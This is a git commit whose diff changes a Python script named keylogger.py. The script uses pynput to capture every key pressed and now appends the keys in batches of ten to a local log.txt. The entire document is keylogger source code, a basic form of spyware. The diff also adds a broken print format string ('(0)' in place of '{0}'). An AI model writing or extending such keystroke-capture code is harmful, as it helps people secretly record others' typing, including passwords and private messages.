ed3cb4fabb83a92b8af1fcb58d82664cff30a6a1
dragan.pecanac <dragan.pecanac.dev@gmail.com>
2022-03-16 17:57:51 -0700

    keylogger saves log.txt

--- keylogger.py
+++ keylogger.py
@@ -2,8 +2,26 @@ import pynput
 
 from pynput.keyboard import Key, Listener
 
+count = 0
+keys = []
+
 def on_press(key):
-    print("{0} pressed".format(key))
+    global keys, count
+
+    keys.append(key)
+    count += 1
+    print("(0) pressed".format(key))
+
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = []
+
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            f.write(str(key))
+
 
 def on_release(key):
     if key == Key.esc:
